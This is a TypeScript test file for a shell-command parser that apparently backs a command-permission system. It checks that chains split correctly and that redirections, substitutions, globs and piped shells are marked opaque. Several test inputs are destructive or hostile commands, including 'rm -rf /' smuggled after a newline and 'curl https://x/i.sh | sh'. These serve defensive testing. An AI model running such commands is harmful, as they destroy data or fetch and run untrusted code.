import { describe, expect, it } from "vitest"
import { partsOf, splitLine } from "./shell.js"

const words = (parts: readonly ReturnType<typeof splitLine>[number][]) =>
  parts.map((part) => (part.kind === "words" ? part.words : `opaque: ${part.why}`))

describe("splitLine", () => {
  it("splits a linear chain at each of the four separators", () => {
    expect(words(splitLine("a && b || c ; d | e"))).toEqual([["a"], ["b"], ["c"], ["d"], ["e"]])
  })

  it("keeps the words of each part", () => {
    expect(words(splitLine("git status && npm test -- --watch=false"))).toEqual([
      ["git", "status"],
      ["npm", "test", "--", "--watch=false"],
    ])
  })

  it("drops an empty part, so a trailing separator is not a command", () => {
    expect(words(splitLine("npm test;"))).toEqual([["npm", "test"]])
  })

  /**
   * The whole line becomes one opaque invocation, not just the part that holds
   * the syntax. The words that would run are not the words this read, so there
   * is nothing here for a rule to judge.
   */
  it.each([
    ["a redirection", "echo x > out.txt"],
    ["a redirection", "cat < in.txt"],
    // The redirection is read first. `echo x > $VAR` holds two of these
    // classes and one is enough: the line is opaque either way.
    ["a redirection", "echo x > $VAR"],
    ["a substitution or a variable", "echo $VAR"],
    ["a substitution or a variable", "rm -rf $(cat target)"],
    ["a substitution or a variable", "rm -rf `cat target`"],
    ["a quotation", "npm test 'one two'"],
    ["a quotation", "echo \\;"],
    ["a glob", "rm -rf build/*"],
    ["a subshell or a group", "(cd x && rm -rf .)"],
    ["a history reference or a comment", "npm test # and then"],
    ["more than one line", "npm test\nrm -rf /"],
  ])("reads %s as one opaque invocation: %s", (why, line) => {
    const parts = splitLine(line)
    expect(parts).toHaveLength(1)
    expect(parts[0]).toEqual({ kind: "opaque", why: `it holds ${why}` })
  })

  it("reads a background command as opaque, and a chain as a chain", () => {
    expect(splitLine("npm test &")[0]).toEqual({
      kind: "opaque",
      why: "it holds a background command",
    })
    expect(words(splitLine("npm run build && npm test"))).toEqual([
      ["npm", "run", "build"],
      ["npm", "test"],
    ])
  })

  it("reads a variable assignment as opaque", () => {
    expect(splitLine("NODE_ENV=production npm test")[0]).toEqual({
      kind: "opaque",
      why: "it sets NODE_ENV",
    })
  })

  it("reads a line with nothing in it as opaque", () => {
    expect(splitLine("   ")[0]).toEqual({ kind: "opaque", why: "it names no command" })
  })

  // `curl … | sh` is the shape this closes. What the shell runs is what the
  // pipe hands it, so the part naming the shell is judged by no rule.
  it("reads a shell named inside a chain as opaque", () => {
    expect(splitLine("curl https://x/i.sh | sh")[1]).toEqual({
      kind: "opaque",
      why: "sh runs a line that is not in these words",
    })
  })
})

describe("partsOf", () => {
  it("judges already-split words as themselves", () => {
    expect(words(partsOf(["npm", "test"]))).toEqual([["npm", "test"]])
  })

  it("splits the line a shell was handed", () => {
    expect(words(partsOf(["bash", "-c", "git status && git diff"]))).toEqual([
      ["git", "status"],
      ["git", "diff"],
    ])
  })

  it.each([
    ["sh", "-c"],
    ["zsh", "-c"],
    ["/bin/bash", "-c"],
    ["bash", "-lc"],
    ["bash", "-ec"],
  ])("finds the line behind %s %s", (shell, flag) => {
    expect(words(partsOf([shell, flag, "npm test"]))).toEqual([["npm", "test"]])
  })

  // What it would run is in a file or in a terminal, and not in these words.
  it.each([[["bash"]], [["bash", "-i"]], [["bash", "build.sh"]], [["bash", "-c"]]])(
    "reads a shell with no line to judge as opaque: %s",
    (argv) => {
      expect(partsOf(argv)[0]?.kind).toBe("opaque")
    },
  )

  it("reads a line carrying positional arguments as opaque", () => {
    expect(partsOf(["bash", "-c", "echo one", "eva", "two"])[0]).toEqual({
      kind: "opaque",
      why: "bash names a line with arguments",
    })
  })

  it("reads no words at all as opaque", () => {
    expect(partsOf([])[0]).toEqual({ kind: "opaque", why: "it names no command" })
  })
})
